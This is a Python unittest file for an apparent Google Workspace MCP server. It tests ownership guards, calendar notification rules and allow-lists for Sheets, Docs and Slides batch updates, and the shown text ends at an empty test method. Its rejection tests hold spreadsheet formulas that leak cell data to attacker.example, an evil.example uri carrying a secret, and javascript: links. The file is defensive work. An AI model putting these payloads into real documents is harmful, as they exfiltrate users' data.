"""Gmail / Calendar / Sheets / Docs / Slides ツールのテスト。Google API はモックする。"""

import base64
import json
import unittest
from unittest.mock import MagicMock

from gws_mcp.schema import SchemaError, validate
from gws_mcp.server import MCPServer
from gws_mcp.tools import GUARD_CREATED, GUARD_MYDRIVE, GUARD_OWN_EVENT, load_tools

FILE_ID = "1AbCdEfGhIjKlMnOp"
NEW_ID = "1NeWfIlEiDxYz9876"

MY_FILE = {"id": FILE_ID, "name": "自分のファイル", "mimeType": "x", "ownedByMe": True, "trashed": False}
SHARED_DRIVE_FILE = {**MY_FILE, "driveId": "0ABCDEF", "ownedByMe": False}
OTHERS_FILE = {**MY_FILE, "ownedByMe": False}
NEW_FILE = {**MY_FILE, "id": NEW_ID, "name": "新規"}

META = {
    "_meta": {
        "io.modelcontextprotocol/protocolVersion": "2026-07-28",
        "io.modelcontextprotocol/clientCapabilities": {},
    }
}


class FakeServices:
    """Drive の files().get() は fileId ごとに metadata を返し、他のサービスは MagicMock。"""

    def __init__(self, files: dict | None = None):
        files = files or {}
        self.apis = {name: MagicMock() for name in ("drive", "gmail", "calendar", "sheets", "docs", "slides")}

        def get(fileId, **kwargs):
            req = MagicMock()
            req.execute.return_value = files[fileId]
            return req

        self.apis["drive"].files.return_value.get.side_effect = get
        self.sheets_values.update.return_value.execute.return_value = {}
        self.sheets_values.append.return_value.execute.return_value = {}

    def get(self, name):
        return self.apis[name]

    @property
    def sheets_values(self):
        return self.apis["sheets"].spreadsheets.return_value.values.return_value

    @property
    def docs_documents(self):
        return self.apis["docs"].documents.return_value

    @property
    def slides_presentations(self):
        return self.apis["slides"].presentations.return_value

    @property
    def calendar_events(self):
        return self.apis["calendar"].events.return_value


def call(services, name, arguments):
    server = MCPServer(load_tools(), services)
    msg = {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {**META, "name": name, "arguments": arguments}}
    return server.handle(msg)["result"]


# 既存ファイルに書き込むツールと、その最小限の引数・書き込みに使う API 呼び出し
WRITE_TOOLS = {
    "sheets_write_range": (
        {"spreadsheet_id": FILE_ID, "range": "A1", "values": [["x"]]},
        lambda s: s.sheets_values.update,
    ),
    "sheets_append_rows": (
        {"spreadsheet_id": FILE_ID, "range": "A1", "values": [["x"]]},
        lambda s: s.sheets_values.append,
    ),
    "sheets_add_sheet": (
        {"spreadsheet_id": FILE_ID, "title": "新シート"},
        lambda s: s.apis["sheets"].spreadsheets.return_value.batchUpdate,
    ),
    "sheets_batch_update": (
        {"spreadsheet_id": FILE_ID, "requests": '[{"autoResizeDimensions": {"dimensions": {"sheetId": 0}}}]'},
        lambda s: s.apis["sheets"].spreadsheets.return_value.batchUpdate,
    ),
    "docs_append_text": ({"document_id": FILE_ID, "text": "x"}, lambda s: s.docs_documents.batchUpdate),
    "docs_batch_update": (
        {"document_id": FILE_ID, "requests": '[{"insertText": {"text": "x", "endOfSegmentLocation": {}}}]'},
        lambda s: s.docs_documents.batchUpdate,
    ),
    "docs_replace_text": (
        {"document_id": FILE_ID, "find": "a", "replace": "b"},
        lambda s: s.docs_documents.batchUpdate,
    ),
    "slides_add_text_slide": ({"presentation_id": FILE_ID, "title": "x"}, lambda s: s.slides_presentations.batchUpdate),
    "slides_replace_text": (
        {"presentation_id": FILE_ID, "find": "a", "replace": "b"},
        lambda s: s.slides_presentations.batchUpdate,
    ),
    "slides_batch_update": (
        {"presentation_id": FILE_ID, "requests": '[{"deleteObject": {"objectId": "s_12345"}}]'},
        lambda s: s.slides_presentations.batchUpdate,
    ),
}


# 作成先を指定できない新規作成ツールと、作成に使う API 呼び出し・応答の ID キー
CREATE_TOOLS = {
    "sheets_create": (lambda s: s.apis["sheets"].spreadsheets.return_value.create, "spreadsheetId"),
    "docs_create": (lambda s: s.docs_documents.create, "documentId"),
    "slides_create": (lambda s: s.slides_presentations.create, "presentationId"),
}

# カレンダーの書き込みツール
CALENDAR_WRITE_TOOLS = ("calendar_create_event", "calendar_update_event")


class GuardCoverageTest(unittest.TestCase):
    """Drive 以外の書き込みツールが、宣言した guard に対応するテストの対象になっていること。"""

    def test_書き込みツールはすべてガードのテスト対象(self):
        tested = {
            GUARD_MYDRIVE: set(WRITE_TOOLS),
            GUARD_CREATED: set(CREATE_TOOLS),
            GUARD_OWN_EVENT: set(CALENDAR_WRITE_TOOLS),
        }
        for name, tool in load_tools().items():
            if tool.read_only or name.startswith("drive_"):
                continue
            with self.subTest(tool=name):
                self.assertIn(name, tested.get(tool.guard, set()), f"guard={tool.guard}")


class WriteGuardTest(unittest.TestCase):
    def test_共有ドライブのファイルには書き込まない(self):
        for name, (args, api) in WRITE_TOOLS.items():
            with self.subTest(tool=name):
                s = FakeServices({FILE_ID: SHARED_DRIVE_FILE})
                result = call(s, name, args)
                self.assertTrue(result["isError"])
                self.assertIn("共有ドライブ", result["content"][0]["text"])
                api(s).assert_not_called()

    def test_他人のファイルには書き込まない(self):
        for name, (args, api) in WRITE_TOOLS.items():
            with self.subTest(tool=name):
                s = FakeServices({FILE_ID: OTHERS_FILE})
                result = call(s, name, args)
                self.assertTrue(result["isError"])
                self.assertIn("所有者", result["content"][0]["text"])
                api(s).assert_not_called()

    def test_自分のファイルには書き込める(self):
        for name, (args, api) in WRITE_TOOLS.items():
            with self.subTest(tool=name):
                s = FakeServices({FILE_ID: MY_FILE})
                api(s).return_value.execute.return_value = {"replies": [{"addSheet": {"properties": {}}}]}
                result = call(s, name, args)
                self.assertFalse(result["isError"], result)
                api(s).assert_called_once()


class CreateTest(unittest.TestCase):
    def test_作成したファイルがマイドライブのものか確認する(self):
        for name, (api, id_key) in CREATE_TOOLS.items():
            with self.subTest(tool=name):
                s = FakeServices({NEW_ID: NEW_FILE})
                api(s).return_value.execute.return_value = {id_key: NEW_ID}
                result = call(s, name, {"title": "新規"})
                self.assertFalse(result["isError"], result)
                self.assertEqual(s.apis["drive"].files.return_value.get.call_args.kwargs["fileId"], NEW_ID)

    def test_作成先が想定外なら失敗として返す(self):
        for name, (api, id_key) in CREATE_TOOLS.items():
            with self.subTest(tool=name):
                s = FakeServices({NEW_ID: {**NEW_FILE, "driveId": "0ABCDEF"}})
                api(s).return_value.execute.return_value = {id_key: NEW_ID}
                result = call(s, name, {"title": "新規"})
                self.assertTrue(result["isError"])

    def test_作成先が想定外なら本文を書き込まない(self):
        s = FakeServices({NEW_ID: {**NEW_FILE, "driveId": "0ABCDEF"}})
        s.docs_documents.create.return_value.execute.return_value = {"documentId": NEW_ID}
        call(s, "docs_create", {"title": "新規", "text": "本文"})
        s.docs_documents.batchUpdate.assert_not_called()


class SheetsTest(unittest.TestCase):
    def test_既定はRAWで書き込む(self):
        s = FakeServices({FILE_ID: MY_FILE})
        call(s, "sheets_write_range", {"spreadsheet_id": FILE_ID, "range": "A1", "values": [["=IMPORTDATA(\"x\")"]]})
        self.assertEqual(s.sheets_values.update.call_args.kwargs["valueInputOption"], "RAW")

    def test_USER_ENTEREDは明示したときだけ(self):
        s = FakeServices({FILE_ID: MY_FILE})
        call(
            s,
            "sheets_append_rows",
            {"spreadsheet_id": FILE_ID, "range": "A1", "values": [[1, "a", True]], "value_input_option": "USER_ENTERED"},
        )
        self.assertEqual(s.sheets_values.append.call_args.kwargs["valueInputOption"], "USER_ENTERED")

    def _write_formulas(self, values, option="USER_ENTERED"):
        """書き込みツールごとに values を書き込み、(ツール名, 結果, API 呼び出し) を返す。"""
        for name in ("sheets_write_range", "sheets_append_rows"):
            s = FakeServices({FILE_ID: MY_FILE})
            args = {"spreadsheet_id": FILE_ID, "range": "A1", "values": values, "value_input_option": option}
            yield name, call(s, name, args), WRITE_TOOLS[name][1](s)

    def test_外部に出ない数式は書き込める(self):
        values = [['=SUM(A1:A3)', '=IMPORTRANGE("https://docs.google.com/spreadsheets/d/x", "A1")', '=HYPERLINK("https://example.com")']]
        for name, result, api in self._write_formulas(values):
            with self.subTest(tool=name):
                self.assertFalse(result["isError"], result)
                self.assertEqual(api.call_args.kwargs["body"], {"values": values})

    def test_外部URLにアクセスする関数は拒否する(self):
        cases = {
            "そのまま": '=IMPORTDATA("https://attacker.example/?d="&A1)',
            "小文字": '=image("https://attacker.example/a.png")',
            "空白入り": '= IMAGE ("https://attacker.example/a.png")',
            "入れ子": '=IF(1,IMPORTXML("https://attacker.example","//a"))',
            "先頭が+": '+IMPORTFEED("https://attacker.example")',
        }
        for label, formula in cases.items():
            for name, result, api in self._write_formulas([[formula]]):
                with self.subTest(case=label, tool=name):
                    self.assertTrue(result["isError"])
                    api.assert_not_called()

    def test_1セルでも該当すれば全体を拒否し位置を示す(self):
        values = [["=SUM(A1:A3)", "a"], [1, '=IMPORTHTML("https://attacker.example","table",1)']]
        for name, result, api in self._write_formulas(values):
            with self.subTest(tool=name):
                self.assertTrue(result["isError"])
                self.assertIn("values[1][1]（IMPORTHTML）", result["content"][0]["text"])
                api.assert_not_called()

    def test_RAWなら外部アクセス関数も文字列として書き込める(self):
        values = [['=IMPORTDATA("https://example.com")']]
        for name, result, api in self._write_formulas(values, option="RAW"):
            with self.subTest(tool=name):
                self.assertFalse(result["isError"], result)
                self.assertEqual(api.call_args.kwargs["valueInputOption"], "RAW")
                self.assertEqual(api.call_args.kwargs["body"], {"values": values})

    def test_セル値は文字列_数値_真偽値のみ(self):
        schema = load_tools()["sheets_write_range"].input_schema
        validate(schema, {"spreadsheet_id": FILE_ID, "range": "A1", "values": [["a", 1, 1.5, False]]})
        with self.assertRaises(SchemaError):
            validate(schema, {"spreadsheet_id": FILE_ID, "range": "A1", "values": [[{"a": 1}]]})
        with self.assertRaises(SchemaError):
            validate(schema, {"spreadsheet_id": FILE_ID, "range": "A1", "values": [[None]]})


# 書式のリクエストの例
_BOLD_HEADER = {
    "repeatCell": {
        "range": {"sheetId": 0, "endRowIndex": 1},
        "cell": {"userEnteredFormat": {"textFormat": {"bold": True}}},
        "fields": "userEnteredFormat.textFormat.bold",
    }
}


def _rule(value, condition_type="TEXT_EQ"):
    """条件の値に value を入れた条件付き書式のリクエスト。"""
    return {
        "addConditionalFormatRule": {
            "rule": {
                "ranges": [{"sheetId": 0}],
                "booleanRule": {
                    "condition": {"type": condition_type, "values": [{"userEnteredValue": value}]},
                    "format": {"backgroundColor": {"red": 1}},
                },
            }
        }
    }


def _dropdown(*choices):
    """選択肢を choices にしたプルダウンのリクエスト。"""
    values = [{"userEnteredValue": c} for c in choices]
    return {
        "setDataValidation": {
            "range": {"sheetId": 0, "startColumnIndex": 2, "endColumnIndex": 3},
            "rule": {"condition": {"type": "ONE_OF_LIST", "values": values}, "showCustomUi": True},
        }
    }


class SheetsBatchUpdateTest(unittest.TestCase):
    def _call(self, requests):
        """requests を JSON 文字列にして呼ぶ。結果と batchUpdate のモックを返す。"""
        s = FakeServices({FILE_ID: MY_FILE})
        batch = s.apis["sheets"].spreadsheets.return_value.batchUpdate
        batch.return_value.execute.return_value = {"replies": [{}] * len(requests)}
        text = requests if isinstance(requests, str) else json.dumps(requests)
        return call(s, "sheets_batch_update", {"spreadsheet_id": FILE_ID, "requests": text}), batch

    def _assert_rejected(self, requests, *messages):
        result, batch = self._call(requests)
        self.assertTrue(result["isError"], result)
        for m in messages:
            self.assertIn(m, result["content"][0]["text"])
        batch.assert_not_called()

    def test_書式のリクエストをそのまま渡しrepliesを返す(self):
        requests = [
            _BOLD_HEADER,
            {
                "updateSheetProperties": {
                    "properties": {"sheetId": 0, "gridProperties": {"frozenRowCount": 1}},
                    "fields": "gridProperties.frozenRowCount",
                }
            },
            {
                "updateDimensionProperties": {
                    "range": {"sheetId": 0, "dimension": "COLUMNS", "startIndex": 0, "endIndex": 1},
                    "properties": {"pixelSize": 300},
                    "fields": "pixelSize",
                }
            },
            {"setBasicFilter": {"filter": {"range": {"sheetId": 0}}}},
            {"addBanding": {"bandedRange": {"range": {"sheetId": 0}}}},
            {"mergeCells": {"range": {"sheetId": 0, "endRowIndex": 1}, "mergeType": "MERGE_ALL"}},
            _rule("高"),
            _dropdown("OK", "NG", "保留"),
        ]
        result, batch = self._call(requests)
        self.assertFalse(result["isError"], result)
        self.assertEqual(batch.call_args.kwargs, {"spreadsheetId": FILE_ID, "body": {"requests": requests}})
        self.assertEqual(json.loads(result["content"][0]["text"]), {"replies": [{}] * len(requests)})

    def test_許可リスト外のリクエストは拒否する(self):
        for kind in ("deleteSheet", "deleteRange", "deleteDimension", "updateCells", "appendCells", "pasteData",
                     "copyPaste", "cutPaste", "addProtectedRange", "updateProtectedRange",
                     "addDataSource", "refreshDataSource", "addChart", "addNamedRange", "updateSpreadsheetProperties"):
            with self.subTest(kind=kind):
                self._assert_rejected([{kind: {}}], f"{kind} は使えません")

    def test_repeatCellで値を書き込まない(self):
        cell = {"userEnteredValue": {"formulaValue": "=1+1"}, "userEnteredFormat": {}}
        self._assert_rejected(
            [{"repeatCell": {"range": {"sheetId": 0}, "cell": cell, "fields": "userEnteredFormat"}}],
            "cell.userEnteredValue",
        )

    def test_repeatCellのfieldsは書式の項目だけ(self):
        for fields in ("*", "userEnteredValue", "userEnteredFormat,userEnteredValue", "note", "userEnteredFormatX", ""):
            with self.subTest(fields=fields):
                req = {**_BOLD_HEADER["repeatCell"], "fields": fields}
                self._assert_rejected([{"repeatCell": req}], "fields")

    def test_repeatCellのfieldsは形が崩れていれば拒否する(self):
        for fields in ("userEnteredFormat(a)),userEnteredValue", "userEnteredFormat(a,userEnteredValue",
                       "userEnteredFormat;userEnteredValue", "userEnteredFormat/userEnteredValue",
                       "userEnteredFormat(a)userEnteredValue", "userEnteredFormat(a)(userEnteredValue)",
                       "userEnteredFormat.a userEnteredValue", "userEnteredFormat()", "userEnteredFormat(,)",
                       "userEnteredFormat..x", "userEnteredFormat,,userEnteredValue",
                       "userEnteredFormat" + "(a" * 1000 + ")" * 1000):
            with self.subTest(fields=fields):
                req = {**_BOLD_HEADER["repeatCell"], "fields": fields}
                self._assert_rejected([{"repeatCell": req}], "fields")

    def test_repeatCellはsnake_caseの値も拒否する(self):
        req = {**_BOLD_HEADER["repeatCell"], "cell": {"user_entered_value": {"stringValue": "x"}}}
        self._assert_rejected([{"repeatCell": req}], "cell.user_entered_value")

    def test_fieldsの括弧の入れ子は書式に必要な深さまで(self):
        # 実在する書式で一番深いのは borders(top(colorStyle(rgbColor(red))))
        ok = {**_BOLD_HEADER["repeatCell"], "fields": "userEnteredFormat(borders(top(colorStyle(rgbColor(red)))))"}
        result, _ = self._call([{"repeatCell": ok}])
        self.assertFalse(result["isError"], result)
        too_deep = {**_BOLD_HEADER["repeatCell"], "fields": "userEnteredFormat(a(b(c(d(e(f))))))"}
        self._assert_rejected([{"repeatCell": too_deep}], "fields")

    def test_fieldsの特殊な空白は拒否する(self):
        for fields in ("userEnteredFormat\x1c(a)", "userEnteredFormat(a)\xa0", "userEnteredFormat\u3000,userEnteredValue"):
            with self.subTest(fields=fields):
                self._assert_rejected([{"repeatCell": {**_BOLD_HEADER["repeatCell"], "fields": fields}}], "fields")

    def test_repeatCellのfieldsは括弧でまとめて指定できる(self):
        req = {**_BOLD_HEADER["repeatCell"], "fields": "userEnteredFormat(textFormat,backgroundColor), userEnteredFormat.wrapStrategy"}
        result, batch = self._call([{"repeatCell": req}])
        self.assertFalse(result["isError"], result)
        batch.assert_called_once()

    def test_シートと列幅のfieldsは許可した項目を通す(self):
        cases = {
            "updateSheetProperties": "gridProperties.frozenRowCount,gridProperties.frozenColumnCount,tabColorStyle",
            "updateDimensionProperties": "pixelSize",
        }
        for kind, fields in cases.items():
            with self.subTest(kind=kind):
                result, batch = self._call([{kind: {"properties": {}, "fields": fields}}])
                self.assertFalse(result["isError"], result)
                batch.assert_called_once()

    def test_シートと列幅のfieldsは許可した項目だけ(self):
        cases = {
            "updateSheetProperties": ("title", "gridProperties.rowCount", "hidden", "*", ""),
            "updateDimensionProperties": ("hiddenByUser", "pixelSize,hiddenByUser", "*", ""),
        }
        for kind, fields_list in cases.items():
            for fields in fields_list:
                with self.subTest(kind=kind, fields=fields):
                    self._assert_rejected([{kind: {"properties": {}, "fields": fields}}], "fields")

    def test_フィルタの絞り込みは通す(self):
        spec = {"columnIndex": 0, "filterCriteria": {"hiddenValues": ["x"]}}
        req = {"filter": {"range": {"sheetId": 0}, "filterSpecs": [spec], "criteria": {}}}
        result, batch = self._call([{"setBasicFilter": req}])
        self.assertFalse(result["isError"], result)
        batch.assert_called_once()

    def test_並べ替えと検索置換は通す(self):
        sort = [{"dimensionIndex": 0, "sortOrder": "ASCENDING"}]
        requests = [
            {"sortRange": {"range": {"sheetId": 0, "startRowIndex": 1}, "sortSpecs": sort}},
            {"setBasicFilter": {"filter": {"range": {"sheetId": 0}, "sortSpecs": sort}}},
            {"findReplace": {"find": "旧", "replacement": "新", "allSheets": True}},
        ]
        result, batch = self._call(requests)
        self.assertFalse(result["isError"], result)
        batch.assert_called_once()

    def test_置換後の文字列で外部URLにアクセスする関数は拒否する(self):
        req = {"findReplace": {"find": "x", "replacement": '=IMPORTDATA("https://example.com")', "allSheets": True}}
        self._assert_rejected([req], "外部 URL")

    def test_cellがオブジェクトでなければ拒否する(self):
        self._assert_rejected([{"repeatCell": {**_BOLD_HEADER["repeatCell"], "cell": "userEnteredValue"}}], "cell: オブジェクト")

    def test_条件の数式で外部URLにアクセスする関数は拒否する(self):
        for req in (
            _rule('=IMPORTXML("https://example.com/?q="&A1, "//a")', "CUSTOM_FORMULA"),
            _rule("=image(A1)", "CUSTOM_FORMULA"),
            _dropdown("OK", '=IMPORTDATA("https://example.com")'),
            {"setDataValidation": {**_dropdown()["setDataValidation"], "rule": {"condition": {
                "type": "CUSTOM_FORMULA", "values": [{"userEnteredValue": '=IMPORTFEED("https://example.com")'}]}}}},
        ):
            with self.subTest(req=req):
                self._assert_rejected([req], "外部 URL")

    def test_条件の数式でも外部に出ないものは通す(self):
        result, batch = self._call([_rule('=$B1="高"', "CUSTOM_FORMULA")])
        self.assertFalse(result["isError"], result)
        batch.assert_called_once()

    def test_一部だけ不正なら全体を拒否する(self):
        self._assert_rejected([_BOLD_HEADER, {"deleteSheet": {"sheetId": 0}}], "requests[1]", "何も変更していません")
        self._assert_rejected([_BOLD_HEADER, _rule("=IMPORTHTML(A1)", "CUSTOM_FORMULA")], "requests[1]")

    def test_形の不正な入力は拒否する(self):
        for text in ("not json", "{}", "[]", "[1]", '[{"repeatCell": {}, "mergeCells": {}}]', '[{"mergeCells": []}]'):
            with self.subTest(text=text):
                self._assert_rejected(text)

    def test_件数の上限を超えると拒否する(self):
        result, batch = self._call([{"autoResizeDimensions": {}}] * 200)
        self.assertFalse(result["isError"], result)
        self._assert_rejected([{"autoResizeDimensions": {}}] * 201, "200 件以下")

    def test_文字列の長さの上限を超えると拒否する(self):
        schema = load_tools()["sheets_batch_update"].input_schema
        with self.assertRaises(SchemaError):
            validate(schema, {"spreadsheet_id": FILE_ID, "requests": "x" * 200_001})

    def test_入れ子が深くても検査の途中で落ちない(self):
        # Python の再帰の上限（既定 1000）を超える深さでも、最後の文字列まで検査が届く
        depth = 5_000
        text = '[{"autoResizeDimensions": ' + '{"x": ' * depth + '"=IMAGE(A1)"' + "}" * depth + "}]"
        self._assert_rejected(text, "外部 URL")


# 参加者がいる予定の作成引数
_MEETING = {
    "summary": "打合せ",
    "start": "2026-10-01T10:00:00+09:00",
    "end": "2026-10-01T11:00:00+09:00",
    "attendees": ["a@example.com"],
}


class CalendarTest(unittest.TestCase):
    def test_作成はprimaryで指定どおりに通知する(self):
        s = FakeServices()
        s.calendar_events.insert.return_value.execute.return_value = {"id": "e1"}
        result = call(s, "calendar_create_event", {**_MEETING, "send_updates": "all"})
        self.assertFalse(result["isError"], result)
        kwargs = s.calendar_events.insert.call_args.kwargs
        self.assertEqual(kwargs["calendarId"], "primary")
        self.assertEqual(kwargs["sendUpdates"], "all")
        self.assertEqual(kwargs["body"]["start"], {"dateTime": "2026-10-01T10:00:00+09:00"})

    def test_参加者がいて通知の指定がなければ作成しない(self):
        s = FakeServices()
        result = call(s, "calendar_create_event", _MEETING)
        self.assertTrue(result["isError"])
        self.assertIn("send_updates", result["content"][0]["text"])
        s.calendar_events.insert.assert_not_called()

    def test_参加者がいなければ通知の指定は不要(self):
        s = FakeServices()
        s.calendar_events.insert.return_value.execute.return_value = {"id": "e1"}
        args = {k: v for k, v in _MEETING.items() if k != "attendees"}
        result = call(s, "calendar_create_event", args)
        self.assertFalse(result["isError"], result)
        self.assertEqual(s.calendar_events.insert.call_args.kwargs["sendUpdates"], "none")

    def test_終日予定は日付で作成(self):
        s = FakeServices()
        s.calendar_events.insert.return_value.execute.return_value = {"id": "e1"}
        call(s, "calendar_create_event", {"summary": "休暇", "start": "2026-10-01", "end": "2026-10-02"})
        self.assertEqual(s.calendar_events.insert.call_args.kwargs["body"]["start"], {"date": "2026-10-01"})

    def test_書き込みツールはカレンダーIDを受け付けない(self):
        tools = load_tools()
        for name in CALENDAR_WRITE_TOOLS:
            self.assertNotIn("calendar_id", tools[name].input_schema["properties"])

    def test_他人が主催の予定は更新しない(self):
        s = FakeServices()
        s.calendar_events.get.return_value.execute.return_value = {"id": "e1", "organizer": {"email": "other@example.com"}}
        result = call(s, "calendar_update_event", {"event_id": "e1", "summary": "変更"})
        self.assertTrue(result["isError"])
        s.calendar_events.patch.assert_not_called()

    def test_自分が主催の予定は指定項目だけ更新(self):
        s = FakeServices()
        s.calendar_events.get.return_value.execute.return_value = {"id": "e1", "organizer": {"self": True}}
        s.calendar_events.patch.return_value.execute.return_value = {"id": "e1"}
        result = call(s, "calendar_update_event", {"event_id": "e1", "summary": "変更"})
        self.assertFalse(result["isError"], result)
        kwargs = s.calendar_events.patch.call_args.kwargs
        self.assertEqual(kwargs["body"], {"summary": "変更"})
        self.assertEqual(kwargs["calendarId"], "primary")
        self.assertEqual(kwargs["sendUpdates"], "none")

    def test_既存の予定に参加者がいれば通知の指定がないと更新しない(self):
        s = FakeServices()
        s.calendar_events.get.return_value.execute.return_value = {
            "id": "e1",
            "organizer": {"self": True},
            "attendees": [{"email": "a@example.com"}],
        }
        result = call(s, "calendar_update_event", {"event_id": "e1", "summary": "変更"})
        self.assertTrue(result["isError"])
        s.calendar_events.patch.assert_not_called()

    def test_参加者を外すときも通知の指定が必要(self):
        s = FakeServices()
        s.calendar_events.get.return_value.execute.return_value = {
            "id": "e1",
            "organizer": {"self": True},
            "attendees": [{"email": "a@example.com"}],
        }
        result = call(s, "calendar_update_event", {"event_id": "e1", "attendees": []})
        self.assertTrue(result["isError"])
        s.calendar_events.patch.assert_not_called()

    def test_削除ツールは無い(self):
        self.assertFalse([n for n in load_tools() if "delete" in n])


def _b64(text: str) -> str:
    return base64.urlsafe_b64encode(text.encode()).decode().rstrip("=")


class GmailTest(unittest.TestCase):
    def _message(self, payload):
        s = FakeServices()
        messages = s.apis["gmail"].users.return_value.messages.return_value
        messages.get.return_value.execute.return_value = {"id": "abc12345", "threadId": "t", "payload": payload}
        result = call(s, "gmail_get_message", {"message_id": "abc12345"})
        self.assertFalse(result["isError"], result)
        return result["content"][0]["text"]

    def test_text_plainを優先する(self):
        text = self._message(
            {
                "mimeType": "multipart/alternative",
                "headers": [{"name": "Subject", "value": "件名"}],
                "parts": [
                    {"mimeType": "text/plain", "body": {"data": _b64("プレーン本文")}},
                    {"mimeType": "text/html", "body": {"data": _b64("<p>HTML本文</p>")}},
                ],
            }
        )
        self.assertIn("プレーン本文", text)
        self.assertNotIn("HTML本文", text)
        self.assertIn("件名", text)

    def test_HTMLのみならタグとスクリプトを除く(self):
        text = self._message(
            {"mimeType": "text/html", "body": {"data": _b64("<style>x{}</style><script>evil()</script><p>本文&amp;</p>")}}
        )
        self.assertIn("本文&", text)
        self.assertNotIn("evil", text)
        self.assertNotIn("<p>", text)

    def test_添付ファイルは名前だけ返す(self):
        text = self._message(
            {
                "mimeType": "multipart/mixed",
                "parts": [
                    {"mimeType": "text/plain", "body": {"data": _b64("本文")}},
                    {"mimeType": "application/pdf", "filename": "a.pdf", "body": {"attachmentId": "x", "size": 10}},
                ],
            }
        )
        self.assertIn("a.pdf", text)

    def test_Gmailは読み取り専用のツールだけ(self):
        gmail = [t for n, t in load_tools().items() if n.startswith("gmail_")]
        self.assertTrue(gmail)
        self.assertTrue(all(t.read_only for t in gmail))


def _link(link):
    return {
        "updateTextStyle": {
            "range": {"startIndex": 1, "endIndex": 5},
            "textStyle": {"link": link},
            "fields": "link",
        }
    }


class DocsBatchUpdateTest(unittest.TestCase):
    def _call(self, requests):
        """requests を JSON 文字列にして呼ぶ。結果と batchUpdate のモックを返す。"""
        s = FakeServices({FILE_ID: MY_FILE})
        s.docs_documents.batchUpdate.return_value.execute.return_value = {"replies": [{}] * len(requests)}
        text = requests if isinstance(requests, str) else json.dumps(requests)
        return call(s, "docs_batch_update", {"document_id": FILE_ID, "requests": text}), s.docs_documents.batchUpdate

    def _assert_rejected(self, requests, *messages):
        result, batch = self._call(requests)
        self.assertTrue(result["isError"], result)
        for m in messages:
            self.assertIn(m, result["content"][0]["text"])
        batch.assert_not_called()

    def test_見出しと箇条書きと表のリクエストをそのまま渡しrepliesを返す(self):
        requests = [
            {
                "updateParagraphStyle": {
                    "range": {"startIndex": 1, "endIndex": 6},
                    "paragraphStyle": {"namedStyleType": "HEADING_2"},
                    "fields": "namedStyleType",
                }
            },
            {"createParagraphBullets": {"range": {"startIndex": 6, "endIndex": 21}, "bulletPreset": "BULLET_DISC_CIRCLE_SQUARE"}},
            {"insertTable": {"rows": 2, "columns": 2, "endOfSegmentLocation": {}}},
            {"deleteContentRange": {"range": {"startIndex": 30, "endIndex": 40}}},
            _link({"url": "https://example.com/a?b=c"}),
            _link({"heading": {"id": "h.1", "tabId": "t.0"}}),
        ]
        result, batch = self._call(requests)
        self.assertFalse(result["isError"], result)
        self.assertEqual(batch.call_args.kwargs, {"documentId": FILE_ID, "body": {"requests": requests}})
        self.assertEqual(json.loads(result["content"][0]["text"]), {"replies": [{}] * len(requests)})

    def test_許可リスト外のリクエストは拒否する(self):
        for kind in ("insertInlineImage", "replaceImage", "insertComment", "addCommentReply", "insertPerson",
                     "acceptSuggestion", "deleteTab", "insertRichLink", "insert_inline_image"):
            with self.subTest(kind=kind):
                self._assert_rejected([{kind: {}}], f"{kind} は使えません")

    def test_入れ子のuriは種類にかかわらず拒否する(self):
        uri = {"insertText": {"text": "x", "location": {"index": 1}, "extra": [{"uri": "https://evil.example/?q=秘密"}]}}
        self._assert_rejected([uri], "requests[0].insertText.extra[0].uri")

    def test_httpとhttps以外のリンクは拒否する(self):
        for url in ("javascript:alert(1)", "ftp://example.com", "", 1, "//example.com", " https://example.com"):
            with self.subTest(url=url):
                self._assert_rejected([_link({"url": url})], "textStyle.link.url")

    def test_大文字のスキームと文書内リンクは通す(self):
        for link in ({"url": "HTTPS://Example.com"}, {"bookmark": {"id": "kix.1"}}, {"tabId": "t.1"}):
            with self.subTest(link=link):
                result, batch = self._call([_link(link)])
                self.assertFalse(result["isError"], result)
                batch.assert_called_once()

    def test_スタイル定義やsnake_caseの入れ子でもリンクを検査する(self):
        named = {"updateNamedStyle": {"namedStyle": {"namedStyleType": "HEADING_2", "textStyle": {"link": {"url": "javascript:x"}}}, "fields": "textStyle.link"}}
        self._assert_rejected([named], "updateNamedStyle.namedStyle.textStyle.link.url")
        snake = {"updateTextStyle": {"range": {"start_index": 1, "end_index": 2}, "text_style": {"link": {"url": "javascript:x"}}, "fields": "link"}}
        self._assert_rejected([snake], "text_style.link.url")

    def test_1件でも不正なら全体を拒否する(self):
        self._assert_rejected([{"insertText": {"text": "x", "endOfSegmentLocation": {}}}, {"insertInlineImage": {}}])


def _slide_link(link: dict) -> dict:
    return {
        "updateTextStyle": {
            "objectId": "t_12345",
            "textRange": {"type": "ALL"},
            "style": {"link": link},
            "fields": "link",
        }
    }


class SlidesBatchUpdateTest(unittest.TestCase):
    def _call(self, requests):
        """requests を JSON 文字列にして呼ぶ。結果と batchUpdate のモックを返す。"""
        s = FakeServices({FILE_ID: MY_FILE})
        s.slides_presentations.batchUpdate.return_value.execute.return_value = {"replies": [{}] * len(requests)}
        text = requests if isinstance(requests, str) else json.dumps(requests)
        return call(s, "slides_batch_update", {"presentation_id": FILE_ID, "requests": text}), s.slides_presentations.batchUpdate

    def _assert_rejected(self, requests, *messages):
        result, batch = self._call(requests)
        self.assertTrue(result["isError"], result)
        for m in messages:
            self.assertIn(m, result["content"][0]["text"])
        batch.assert_not_called()

    def test_スライドと図形と表と削除のリクエストをそのまま渡しrepliesを返す(self):
        requests = [
            {"createSlide": {"objectId": "slide_new1", "slideLayoutReference": {"predefinedLayout": "TITLE_AND_BODY"}}},
            {"duplicateObject": {"objectId": "p1"}},
            {"createShape": {"objectId": "box_1", "shapeType": "RECTANGLE", "elementProperties": {"pageObjectId": "slide_new1"}}},
            {"createTable": {"objectId": "tbl_1", "rows": 2, "columns": 2, "elementProperties": {"pageObjectId": "slide_new1"}}},
            {"insertText": {"objectId": "box_1", "text": "売上"}},
            {"updatePageProperties": {"objectId": "slide_new1", "pageProperties": {"pageBackgroundFill": {"solidFill": {"color": {"rgbColor": {"blue": 1}}}}}, "fields": "pageBackgroundFill.solidFill.color"}},
            {"deleteObject": {"objectId": "p2"}},
            _slide_link({"url": "https://example.com/a?b=c"}),
            _slide_link({"pageObjectId": "p1"}),
            _slide_link({"relativeLink": "NEXT_SLIDE"}),
        ]
        result, batch = self._call(requests)
        self.assertFalse(result["isError"], result)
        self.assertEqual(batch.call_args.kwargs, {"presentationId": FILE_ID, "body": {"requests": requests}})
        self.assertEqual(json.loads(result["content"][0]["text"]), {"replies": [{}] * len(requests)})

    def test_外部URLや別ファイルを取り込むリクエストとコメントは拒否する(self):
